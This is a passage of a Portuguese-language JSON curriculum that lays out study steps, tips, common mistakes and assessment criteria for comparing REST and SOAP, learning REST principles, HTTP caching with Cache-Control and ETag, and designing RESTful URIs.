                                  "tips": "Use tabelas para organizar definições e princípios para facilitar a memorização.",
                                  "learningObjective": "Compreender as bases conceituais de REST e SOAP para estabelecer comparações precisas.",
                                  "commonMistakes": [
                                    "Confundir REST como protocolo em vez de estilo arquitetural",
                                    "Ignorar a evolução histórica de SOAP para WS-* standards"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Comparar Características Técnicas Chave",
                                  "subSteps": [
                                    "Liste métricas de performance: tamanho de payload (JSON leve vs XML verboso).",
                                    "Analise escalabilidade: REST stateless vs SOAP stateful opcional.",
                                    "Compare suporte a segurança: OAuth/JWT em REST vs WS-Security em SOAP.",
                                    "Examine contratos: informal (HATEOAS) em REST vs WSDL formal em SOAP.",
                                    "Avalie interoperabilidade: multiplataforma REST vs enterprise-focused SOAP."
                                  ],
                                  "verification": "Preencha uma tabela com 5 características chave, colunas para REST, SOAP e impacto.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Artigos comparativos como 'REST vs SOAP' no Stack Overflow",
                                    "Ferramentas Postman para testar payloads",
                                    "Exemplos de WSDL online"
                                  ],
                                  "tips": "Meça tamanhos de payloads reais com ferramentas como curl para dados concretos.",
                                  "learningObjective": "Identificar diferenças técnicas que impactam escolhas arquiteturais.",
                                  "commonMistakes": [
                                    "Superestimar simplicidade de REST ignorando complexidade em grandes sistemas",
                                    "Subestimar segurança de REST sem camadas adicionais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Vantagens e Desvantagens em Cenários",
                                  "subSteps": [
                                    "Defina cenários: API pública móvel (REST favorecido por leveza).",
                                    "Cenário enterprise: integrações bancárias (SOAP por segurança e contratos).",
                                    "Avalie trade-offs: escalabilidade REST em microservices vs confiabilidade SOAP.",
                                    "Considere custo: desenvolvimento rápido REST vs setup pesado SOAP.",
                                    "Discuta hibridismo: quando usar ambos em sistemas legados."
                                  ],
                                  "verification": "Escreva um relatório curto recomendando REST ou SOAP para 3 cenários hipotéticos com justificativas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Casos de estudo: Twitter API (REST), Salesforce (SOAP histórico)",
                                    "Whitepapers de Gartner sobre APIs"
                                  ],
                                  "tips": "Use matriz de decisão (cenário x prós/contras) para visualização clara.",
                                  "learningObjective": "Aplicar comparações a contextos reais para decisões informadas.",
                                  "commonMistakes": [
                                    "Generalizar REST como sempre melhor sem considerar requisitos de compliance",
                                    "Ignorar migrações de SOAP para REST em cenários modernos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Verificar Conhecimento",
                                  "subSteps": [
                                    "Resuma vantagens REST: leveza, escalabilidade, flexibilidade.",
                                    "Resuma vantagens SOAP: segurança robusta, contratos formais, transações ACID.",
                                    "Crie um fluxograma de decisão para escolher entre REST e SOAP.",
                                    "Teste com quiz autoavaliativo de 10 perguntas comparativas.",
                                    "Pesquise tendências atuais: GraphQL como alternativa."
                                  ],
                                  "verification": "Apresente um fluxograma e responda corretamente a um quiz comparativo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Quiz online sobre REST/SOAP",
                                    "Ferramentas como Lucidchart para fluxogramas"
                                  ],
                                  "tips": "Inclua métricas quantitativas como latência em testes reais para robustez.",
                                  "learningObjective": "Consolidar conhecimento em uma visão integrada e decisória.",
                                  "commonMistakes": [
                                    "Focar apenas em teoria sem tendências emergentes",
                                    "Bias para uma tecnologia sem equilíbrio"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce, use REST para API de catálogo de produtos (leve e escalável para apps móveis) e SOAP para integração com gateway de pagamentos bancário (segurança WS-Security e contratos WSDL auditáveis).",
                              "finalVerifications": [
                                "Pode listar e explicar 5 diferenças principais entre REST e SOAP.",
                                "Recomenda corretamente REST ou SOAP para 3 cenários variados com razões.",
                                "Identifica quando hibridizar as arquiteturas.",
                                "Explica impactos de performance com exemplos de payload.",
                                "Discute segurança comparativa sem erros conceituais.",
                                "Cria um fluxograma de decisão funcional."
                              ],
                              "assessmentCriteria": [
                                "Precisão factual nas definições e comparações (30%)",
                                "Profundidade na análise de cenários e trade-offs (25%)",
                                "Uso de exemplos concretos e evidências (20%)",
                                "Clareza na estrutura (tabelas, diagramas) (15%)",
                                "Equilíbrio sem bias para uma tecnologia (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: protocolos de autenticação (OAuth vs WS-Security)",
                                "Desenvolvimento de Software: padrões de design e refatoração de APIs",
                                "Gestão de Projetos: avaliação de custo-benefício em integrações",
                                "Redes de Computadores: otimização de HTTP vs XML-RPC",
                                "Banco de Dados: transações distribuídas em serviços web"
                              ],
                              "realWorldApplication": "Empresas como Netflix usam REST para APIs escaláveis de streaming, enquanto bancos como Itaú mantêm SOAP para integrações financeiras seguras e reguladas, otimizando performance e compliance."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.2.1",
                              "10.1.3.1.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.2",
                    "name": "Desenvolvimento de APIs RESTful",
                    "description": "Princípios e práticas para criar APIs stateless e escaláveis usando HTTP.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.2.1",
                        "name": "Princípios Fundamentais do REST",
                        "description": "Compreender os seis princípios arquiteturais do REST (Representational State Transfer) que garantem APIs stateless, escaláveis e uniformes: interface uniforme, client-server, stateless, cacheável, sistema em camadas e código sob demanda (opcional).",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.1.1",
                            "name": "Identificar os seis princípios REST",
                            "description": "Listar e explicar cada um dos seis princípios REST, incluindo como statelessness evita armazenamento de estado no servidor e como a interface uniforme usa identificadores de recursos e representações auto-descritivas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Introdução aos Princípios REST e Client-Server",
                                  "subSteps": [
                                    "Pesquise a definição de REST e sua origem com Roy Fielding.",
                                    "Liste os seis princípios REST: Client-Server, Stateless, Cacheable, Uniform Interface, Layered System e Code on Demand.",
                                    "Estude o princípio Client-Server: separação de responsabilidades entre cliente (UI) e servidor (dados/armazenamento).",
                                    "Identifique exemplos reais, como um navegador web (cliente) acessando um servidor de API.",
                                    "Anote como isso promove escalabilidade e independência de evolução."
                                  ],
                                  "verification": "Escreva um parágrafo explicando Client-Server e confirme se consegue listar todos os seis princípios sem consultar fontes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigo original de Roy Fielding sobre REST (dissertação UC Irvine)",
                                    "Vídeo 'REST Principles' no YouTube (Khan Academy ou freeCodeCamp)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": [
                                    "Use analogias como garçom (cliente) e cozinha (servidor) para visualizar separação.",
                                    "Priorize fontes acadêmicas para precisão."
                                  ],
                                  "learningObjective": "Compreender o princípio Client-Server e listar corretamente os seis princípios REST.",
                                  "commonMistakes": [
                                    "Confundir REST com SOAP (baseado em XML); REST é arquitetural, não protocolo.",
                                    "Omitir Code on Demand como sexto princípio opcional."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Profundidade em Statelessness e Cacheable",
                                  "subSteps": [
                                    "Defina Statelessness: cada requisição contém toda a informação necessária, sem armazenamento de estado no servidor.",
                                    "Explique como evita sobrecarga no servidor (ex: sem sessões armazenadas).",
                                    "Estude Cacheable: respostas podem ser armazenadas em cache para eficiência.",
                                    "Compare stateless com stateful (ex: cookies vs. token JWT em cada request).",
                                    "Crie um diagrama simples de requisição stateless."
                                  ],
                                  "verification": "Simule uma requisição stateless em papel e verifique se o servidor não precisa de contexto anterior.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Documentação HTTP/REST no MDN Web Docs",
                                    "Ferramenta Postman para testar requisições",
                                    "Papel e caneta para diagramas"
                                  ],
                                  "tips": [
                                    "Lembre: stateless não significa sem autenticação; use tokens como Bearer.",
                                    "Teste cache headers como ETag em uma API real."
                                  ],
                                  "learningObjective": "Explicar statelessness com exemplos e diferenciar de cacheable.",
                                  "commonMistakes": [
                                    "Pensar que stateless ignora autenticação (use headers).",
                                    "Confundir cacheable com sempre cachear (depende de headers)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Uniform Interface e seus Componentes",
                                  "subSteps": [
                                    "Defina Uniform Interface: usa identificadores de recursos (URIs), manipulação via representações (JSON/XML), mensagens auto-descritivas (headers) e HATEOAS.",
                                    "Explique identificadores: /users/123 identifica recurso.",
                                    "Descreva representações auto-descritivas: Content-Type header.",
                                    "Estude HATEOAS: links hipermedia para navegação.",
                                    "Analise um exemplo JSON com links HATEOAS."
                                  ],
                                  "verification": "Desmonte uma resposta HTTP de API (ex: JSONPlaceholder) e identifique os 4 componentes da uniform interface.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "API teste JSONPlaceholder ou ReqRes.in",
                                    "Insomnia ou Postman",
                                    "Guia RESTful API Design (Microsoft)"
                                  ],
                                  "tips": [
                                    "Sempre cheque headers HTTP para auto-descritividade.",
                                    "Pratique com URIs RESTful vs. RPC-style (/getUser?id=123)."
                                  ],
                                  "learningObjective": "Decompor e exemplificar os elementos da Uniform Interface.",
                                  "commonMistakes": [
                                    "Usar verbos em URIs (ruim: /getUsers; bom: /users).",
                                    "Ignorar HATEOAS como essencial para maturidade nível 3."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Layered System, Code on Demand e Síntese",
                                  "subSteps": [
                                    "Estude Layered System: camadas ocultas (ex: load balancer, cache proxy).",
                                    "Explique Code on Demand: servidor envia código executável (raro, ex: JavaScript).",
                                    "Sintetize todos os seis princípios em uma tabela comparativa.",
                                    "Discuta como statelessness e uniform interface interagem.",
                                    "Crie flashcards para memorização."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito os seis princípios para um par ou gravando áudio.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Anki ou Quizlet para flashcards",
                                    "Tabela em Google Sheets",
                                    "Vídeo 'REST Architectural Constraints'"
                                  ],
                                  "tips": [
                                    "Visualize layered como cebola: cliente vê apenas a camada externa.",
                                    "Code on Demand é o menos usado hoje; foque nos outros."
                                  ],
                                  "learningObjective": "Integrar todos os princípios e entender interdependências.",
                                  "commonMistakes": [
                                    "Confundir layered com microservices (layered é sobre abstração).",
                                    "Subestimar Code on Demand como irrelevante."
                                  ]
                                }
                              ],
                              "practicalExample": "Analise a API do GitHub (github.com/v3): identifique Client-Server (app GitHub como cliente, API como servidor), Stateless (tokens em cada request), Cacheable (ETag headers), Uniform Interface (/repos/{owner}/{repo} com JSON auto-descritivo e links), Layered (CDNs e proxies), Code on Demand (scripts embeddáveis). Use Postman para GET /user e verifique headers.",
                              "finalVerifications": [
                                "Liste os seis princípios REST sem erros.",
                                "Explique statelessness e como evita estado no servidor com exemplo HTTP.",
                                "Descreva os quatro componentes da Uniform Interface.",
                                "Diferencie cacheable de stateless.",
                                "Identifique layered system em uma arquitetura real.",
                                "Mencione Code on Demand com um caso opcional."
                              ],
                              "assessmentCriteria": [
                                "Precisão na listagem e nomenclatura dos princípios (30%)",
                                "Profundidade na explicação de statelessness e uniform interface (30%)",
                                "Uso de exemplos concretos e diagramas (20%)",
                                "Compreensão de interdependências entre princípios (10%)",
                                "Clareza e estrutura na síntese final (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP/HTTPS e headers para cache/stateless.",
                                "Banco de Dados: Estratégias de cache e escalabilidade sem estado.",
                                "Segurança da Informação: Tokens stateless (JWT) vs. sessões stateful.",
                                "Desenvolvimento Web: Integração com frontend (React/Vue) via APIs RESTful."
                              ],
                              "realWorldApplication": "Em empresas como Netflix ou Uber, APIs RESTful usam esses princípios para escalar serviços globais: stateless permite horizontal scaling sem bancos de sessão, uniform interface simplifica clientes mobile/web, cacheable reduz latência em bilhões de requests diários."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.2",
                            "name": "Aplicar o princípio client-server",
                            "description": "Diferenciar responsabilidades do cliente (apresentação) e servidor (dados e lógica de negócio), projetando APIs que separam essas camadas para maior escalabilidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Princípio Client-Server",
                                  "subSteps": [
                                    "Leia a definição oficial do princípio client-server no contexto REST (RFC 7231).",
                                    "Identifique exemplos cotidianos, como navegação web onde o browser (cliente) solicita páginas ao servidor.",
                                    "Anote as vantagens: independência, escalabilidade e reutilização de componentes.",
                                    "Compare com modelo monolítico para destacar a separação de camadas.",
                                    "Crie um diagrama simples de fluxo client-server."
                                  ],
                                  "verification": "Diagrama criado e anotações mostram compreensão clara das responsabilidades separadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação REST (RFC 7231), papel/caneta ou ferramenta como Draw.io",
                                  "tips": "Use analogias como garçom (cliente) e cozinha (servidor) para fixar conceitos.",
                                  "learningObjective": "Explicar o princípio client-server e suas vantagens em APIs RESTful.",
                                  "commonMistakes": "Confundir cliente com servidor, achando que cliente gerencia dados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar Responsabilidades de Cliente e Servidor",
                                  "subSteps": [
                                    "Liste responsabilidades do cliente: renderização UI, validação de input, chamadas HTTP.",
                                    "Liste responsabilidades do servidor: armazenamento de dados, lógica de negócio, autenticação.",
                                    "Analise um exemplo de código monolítico e identifique violações da separação.",
                                    "Crie tabelas comparativas de 'o que cliente faz' vs 'o que servidor faz'.",
                                    "Discuta cenários de falha: como o sistema continua se cliente falhar."
                                  ],
                                  "verification": "Tabelas completas com pelo menos 5 itens por lado, sem sobreposições.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Editor de texto (VS Code), exemplos de código monolítico online (GitHub)",
                                  "tips": "Lembre: cliente é 'burro' (apenas UI), servidor é 'inteligente' (dados/lógica).",
                                  "learningObjective": "Distinguir precisamente as responsabilidades para evitar acoplamento.",
                                  "commonMistakes": "Atribuir lógica de negócio ao cliente, como cálculos complexos na UI."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Projetar uma API com Separação Client-Server",
                                  "subSteps": [
                                    "Escolha um domínio simples (ex: gerenciamento de tarefas).",
                                    "Defina endpoints RESTful: GET /tasks, POST /tasks, etc., focando em stateless.",
                                    "Crie diagrama de sequência mostrando chamadas cliente-servidor.",
                                    "Especifique payloads JSON para requests/responses.",
                                    "Planeje escalabilidade: múltiplos clientes compartilhando o mesmo servidor."
                                  ],
                                  "verification": "Diagrama de sequência e spec de API documentados em Markdown ou OpenAPI.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Draw.io ou Lucidchart, Swagger Editor para OpenAPI",
                                  "tips": "Garanta que endpoints sejam recursos (nouns), não ações (verbs).",
                                  "learningObjective": "Projetar APIs que enforce separação para escalabilidade.",
                                  "commonMistakes": "Incluir lógica de UI nos endpoints do servidor."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar e Testar a Separação",
                                  "subSteps": [
                                    "Configure servidor simples (Node.js/Express) com rotas para tasks.",
                                    "Crie cliente frontend (HTML/JS ou React) que faz fetch para a API.",
                                    "Implemente CRUD básico sem acoplamento: cliente não acessa DB.",
                                    "Teste com Postman: verifique responses independentes de UI.",
                                    "Simule carga: abra múltiplas abas cliente para testar escalabilidade."
                                  ],
                                  "verification": "Aplicação rodando localmente; testes mostram separação (alterar UI não quebra servidor).",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Node.js, Express, Postman, browser dev tools",
                                  "tips": "Use CORS no servidor para evitar erros cross-origin.",
                                  "learningObjective": "Implementar protótipo funcional demonstrando princípio client-server.",
                                  "commonMistakes": "Expor DB diretamente no cliente via frontend code."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Avaliar e Refinar a Implementação",
                                  "subSteps": [
                                    "Meça performance: tempo de response e escalabilidade com ferramentas como Artillery.",
                                    "Revise código por violações: lógica de negócio no cliente?",
                                    "Adicione autenticação básica no servidor apenas.",
                                    "Documente lições aprendidas em um relatório curto.",
                                    "Refatore para melhorar statelessness."
                                  ],
                                  "verification": "Relatório com métricas e refatorações aplicadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artillery.io para load testing, Git para versionamento",
                                  "tips": "Monitore logs do servidor para detectar acessos indevidos.",
                                  "learningObjective": "Refinar design para máxima separação e escalabilidade.",
                                  "commonMistakes": "Ignorar stateless: armazenar estado no cliente de forma dependente."
                                }
                              ],
                              "practicalExample": "Desenvolva uma API de lista de tarefas: cliente (React app) envia POST /tasks com {title: 'Comprar leite'} para servidor (Express + MongoDB), que persiste e retorna ID. Cliente lista via GET /tasks e renderiza UI. Alterar UI não afeta dados no servidor.",
                              "finalVerifications": [
                                "Cliente renderiza UI sem acesso direto a dados do servidor.",
                                "Servidor gerencia toda lógica de negócio e persistência.",
                                "Múltiplos clientes podem usar a mesma API simultaneamente.",
                                "API responde corretamente via Postman sem frontend.",
                                "Sistema escala: adicionar instâncias de servidor sem mudar cliente.",
                                "Nenhuma lógica sensível exposta no código cliente."
                              ],
                              "assessmentCriteria": [
                                "Separação clara: 100% das responsabilidades corretamente atribuídas (40%).",
                                "Design escalável: endpoints stateless e idempotentes (20%).",
                                "Implementação funcional: CRUD completo sem erros (20%).",
                                "Documentação e diagramas precisos (10%).",
                                "Testes demonstram independência client-server (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: servidor integra com NoSQL/SQL para persistência.",
                                "Segurança da Informação: autenticação e autorização no servidor.",
                                "Arquitetura de Software: padrões como MVC reforçados pela separação.",
                                "Redes de Computadores: compreensão de HTTP, stateless e caching."
                              ],
                              "realWorldApplication": "Em plataformas como Netflix ou e-commerces (Amazon), o app móvel/browser (cliente) gerencia interface personalizada, enquanto servidores escaláveis lidam com recomendações, estoque e pagamentos, permitindo deploy independente e alta disponibilidade global."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.3",
                            "name": "Explicar cacheabilidade em REST",
                            "description": "Demonstrar como cabeçalhos HTTP como ETag e Cache-Control permitem cache de respostas, reduzindo latência e carga no servidor em APIs RESTful.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Cache em HTTP",
                                  "subSteps": [
                                    "Leia a especificação HTTP/1.1 sobre cache (RFC 7234) para entender o modelo geral de cache.",
                                    "Identifique os componentes principais: cliente, cache compartilhado, cache privado e origem (servidor).",
                                    "Diferencie cache fresco (fresh) de cache rançoso (stale) e o papel dos heurísticos de frescor.",
                                    "Estude os benefícios: redução de latência, economia de banda e alívio de carga no servidor.",
                                    "Anote exemplos cotidianos, como cache de imagens em navegadores."
                                  ],
                                  "verification": "Resuma em 3 frases os componentes de cache HTTP e seus benefícios principais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 7234 (Hypertext Transfer Protocol -- Caching)",
                                    "Documentação MDN Web Docs sobre HTTP Caching"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo cliente-cache-servidor; foque em caches públicos vs privados.",
                                  "learningObjective": "Explicar o modelo de cache HTTP e seus componentes fundamentais.",
                                  "commonMistakes": [
                                    "Confundir cache HTTP com cache de aplicação local",
                                    "Ignorar diferenças entre cache cliente e proxy"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Cabeçalho Cache-Control",
                                  "subSteps": [
                                    "Liste as diretivas principais: max-age, no-cache, no-store, public, private, must-revalidate.",
                                    "Teste em um navegador: inspecione respostas HTTP para um site e identifique Cache-Control.",
                                    "Simule cenários: defina max-age=3600 e observe revalidação após expiração.",
                                    "Compare com Expires: entenda por que Cache-Control é preferível por ser mais flexível.",
                                    "Implemente um servidor simples (Node.js/Express) enviando Cache-Control em uma rota."
                                  ],
                                  "verification": "Crie uma tabela comparando 5 diretivas de Cache-Control com seus efeitos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Postman ou curl para testar headers",
                                    "Node.js e Express para servidor de teste",
                                    "MDN: Cache-Control"
                                  ],
                                  "tips": "Use DevTools do Chrome (Network tab) para inspecionar headers em tempo real.",
                                  "learningObjective": "Dominar as diretivas do Cache-Control e seu impacto na cacheabilidade.",
                                  "commonMistakes": [
                                    "Usar Expires em vez de Cache-Control",
                                    "Confundir no-cache com no-store"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar ETag e Validação Condicional",
                                  "subSteps": [
                                    "Entenda ETag como identificador opaco de versão de recurso (hash ou timestamp).",
                                    "Aprenda cabeçalhos condicionais: If-None-Match (cliente envia ETag), 304 Not Modified (resposta).",
                                    "Compare com Last-Modified/If-Modified-Since: ETag é mais preciso para mudanças parciais.",
                                    "Implemente ETag em uma API REST simples: gere hash do conteúdo e valide.",
                                    "Teste falhas: envie ETag inválido e observe 412 Precondition Failed."
                                  ],
                                  "verification": "Desenvolva um endpoint que gera e valida ETag, testando com 304 e 200 respostas.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Node.js/Express com crypto para hash",
                                    "Postman para simular condicionais",
                                    "RFC 7232 (Conditional Requests)"
                                  ],
                                  "tips": "Use weak ETags (W/) para validações semânticas, não byte-perfect.",
                                  "learningObjective": "Implementar e explicar ETag para revalidação eficiente de cache.",
                                  "commonMistakes": [
                                    "Gerar ETags fracos quando strong é necessário",
                                    "Ignorar suporte a múltiplos ETags no If-None-Match"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Cacheabilidade em APIs RESTful e Avaliar Benefícios",
                                  "subSteps": [
                                    "Integre Cache-Control e ETag em uma API REST completa (ex: GET /users/:id).",
                                    "Meça performance: compare latência com e sem cache usando ferramentas como Apache Bench.",
                                    "Discuta idempotência REST: cache só para métodos seguros (GET, HEAD).",
                                    "Analise cenários: alta tráfego, CDNs como CloudFront usando esses headers.",
                                    "Documente trade-offs: cache vs consistência em dados mutáveis."
                                  ],
                                  "verification": "Registre métricas de latência antes/depois e explique redução observada.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Apache Bench (ab) ou Artillery para benchmarking",
                                    "Servidor REST de teste",
                                    "Documentação AWS CloudFront caching"
                                  ],
                                  "tips": "Combine Cache-Control: public, max-age=300 com ETag para camadas de cache.",
                                  "learningObjective": "Aplicar cache em REST, medindo impacto em latência e carga.",
                                  "commonMistakes": [
                                    "Cacher métodos não-idempotentes como POST",
                                    "Definir max-age muito alto para dados voláteis"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce RESTful (GET /products/123), o servidor responde com Cache-Control: public, max-age=600 e ETag: \"abc123\". Cliente armazena resposta. Na próxima requisição, envia If-None-Match: \"abc123\"; servidor retorna 304 se inalterado, economizando 90% de banda.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo completo de cache com ETag e Cache-Control.",
                                "Implementar e testar um endpoint REST cacheável com ferramentas de rede.",
                                "Identificar headers corretos em uma resposta HTTP real de uma API pública.",
                                "Calcular economia de tráfego em um cenário com 1000 requests/minuto.",
                                "Diferenciar cenários onde cache é inapropriado (dados sensíveis ou mutáveis)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na explicação de diretivas Cache-Control (90% cobertura das principais).",
                                "Correta implementação e teste de ETag com status 304 observado.",
                                "Medição quantitativa de redução de latência/carga (pelo menos 50% melhoria).",
                                "Identificação de 3+ erros comuns e como evitá-los.",
                                "Conexão clara com princípios REST (cacheabilidade como constraint).",
                                "Uso adequado de ferramentas e documentação oficial."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP e mecanismos de otimização de tráfego.",
                                "Desenvolvimento Web: Integração com front-end caching em browsers e Service Workers.",
                                "Banco de Dados: Cache de queries vs cache HTTP para escalabilidade.",
                                "Segurança da Informação: Considerações de cache em dados sensíveis (no-store)."
                              ],
                              "realWorldApplication": "Em APIs de grande escala como Twitter ou Netflix, Cache-Control e ETag reduzem custos de servidor em 70%, permitindo servir milhões de requests/segundo via CDNs globais como Akamai, minimizando latência para usuários em qualquer lugar."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.2",
                        "name": "Recursos, URIs e Métodos HTTP",
                        "description": "Definir recursos como entidades principais em REST, projetar URIs hierárquicas e mapear operações CRUD aos métodos HTTP apropriados (GET, POST, PUT, DELETE, PATCH).",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.2.1",
                            "name": "Projetar URIs para recursos RESTful",
                            "description": "Criar URIs nominais e hierárquicas, como /usuarios/{id}/pedidos, seguindo convenções REST para identificar recursos de forma única e intuitiva.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Princípios Fundamentais de URIs RESTful",
                                  "subSteps": [
                                    "Estude as convenções REST: URIs devem ser substantivos no plural para coleções e singular para instâncias.",
                                    "Aprenda sobre hierarquia: use caminhos que reflitam a relação entre recursos pai e filho.",
                                    "Identifique verbos HTTP para ações (GET, POST, PUT, DELETE) em vez de colocá-los na URI.",
                                    "Revise exemplos padrão como /users para coleção e /users/{id} para instância.",
                                    "Analise erros comuns como uso de verbos (/getUsers) ou adjetivos (/active-users)."
                                  ],
                                  "verification": "Liste 5 princípios chave de URIs RESTful com exemplos corretos e incorretos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do REST (Roy Fielding's dissertation)",
                                    "Guia de melhores práticas REST da Microsoft ou Google"
                                  ],
                                  "tips": "Sempre priorize substantivos; evite query strings para filtros hierárquicos quando possível.",
                                  "learningObjective": "Compreender as regras básicas que tornam URIs RESTful intuitivas e escaláveis.",
                                  "commonMistakes": [
                                    "Incluir verbos na URI (ex: /getUsuarios)",
                                    "Usar maiúsculas ou hífens inconsistentes",
                                    "Ignorar plural vs singular"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Recursos e Suas Relações Hierárquicas",
                                  "subSteps": [
                                    "Mapeie os recursos principais do domínio (ex: usuários, pedidos, produtos).",
                                    "Desenhe um diagrama de entidades mostrando relações (um-para-muitos, muitos-para-muitos).",
                                    "Defina coleções (plural) e instâncias (com {id}).",
                                    "Estabeleça hierarquias: sub-recursos sob pais lógicos (ex: pedidos sob usuário).",
                                    "Considere aninhamento máximo de 3 níveis para evitar URIs longas."
                                  ],
                                  "verification": "Crie um diagrama simples com 3 recursos relacionados e suas URIs propostas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação como Draw.io ou Lucidchart",
                                    "Exemplos de modelos de domínio de e-commerce"
                                  ],
                                  "tips": "Pense em termos de substantivos do negócio; pergunte 'qual recurso estou acessando?'",
                                  "learningObjective": "Mapear recursos do domínio para estruturas hierárquicas em URIs.",
                                  "commonMistakes": [
                                    "Aninhar demais (ex: /usuarios/{id}/pedidos/{pedidoId}/itens/{itemId})",
                                    "Confundir coleções com instâncias",
                                    "Ignorar relações não hierárquicas (use query params)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Projetar URIs Nominais e Hierárquicas",
                                  "subSteps": [
                                    "Escreva URIs para coleções: /usuarios, /pedidos.",
                                    "Adicione identificadores: /usuarios/{id}, /pedidos/{pedidoId}.",
                                    "Crie hierarquias: /usuarios/{id}/pedidos, /pedidos/{id}/itens.",
                                    "Use kebab-case ou snake_case consistentemente (ex: /meus-pedidos ou /user-orders).",
                                    "Inclua filtros via query params se necessário: /usuarios?ativo=true."
                                  ],
                                  "verification": "Gere 10 URIs para um cenário de e-commerce e revise contra convenções.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Editor de texto ou IDE como VS Code",
                                    "Lista de convenções REST (RFC 3986 para URIs)"
                                  ],
                                  "tips": "Teste verbalmente: 'GET /usuarios/123/pedidos' deve soar natural.",
                                  "learningObjective": "Construir URIs que identifiquem recursos de forma única e hierárquica.",
                                  "commonMistakes": [
                                    "Usar underscores em vez de hífens",
                                    "Misturar singular/plural",
                                    "Expor chaves internas na URI"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar, Refinar e Documentar as URIs Projetadas",
                                  "subSteps": [
                                    "Verifique unicidade e intuitividade com stakeholders.",
                                    "Teste comprimento e legibilidade das URIs.",
                                    "Aplique versionamento: /v1/usuarios.",
                                    "Documente em OpenAPI/Swagger com exemplos.",
                                    "Simule chamadas HTTP para validar."
                                  ],
                                  "verification": "Produza uma especificação OpenAPI parcial com suas URIs e valide com uma ferramenta.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Swagger Editor online",
                                    "Postman para testes simulados"
                                  ],
                                  "tips": "Use ferramentas de linting para URIs; priorize consistência global.",
                                  "learningObjective": "Garantir que URIs sejam robustas, documentadas e prontas para uso.",
                                  "commonMistakes": [
                                    "Esquecer versionamento",
                                    "Não considerar encoding de caracteres especiais",
                                    "Falta de documentação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema de e-commerce: /produtos (coleção), /produtos/{id} (instância), /usuarios/{id}/pedidos (hierarquia), /pedidos/{id}/itens (sub-recurso). GET /usuarios/123/pedidos lista pedidos do usuário 123.",
                              "finalVerifications": [
                                "Todas URIs usam substantivos no plural para coleções e são hierárquicas onde aplicável.",
                                "Nenhuma URI contém verbos ou ações.",
                                "Identificadores usam {id} padrão e kebab-case consistente.",
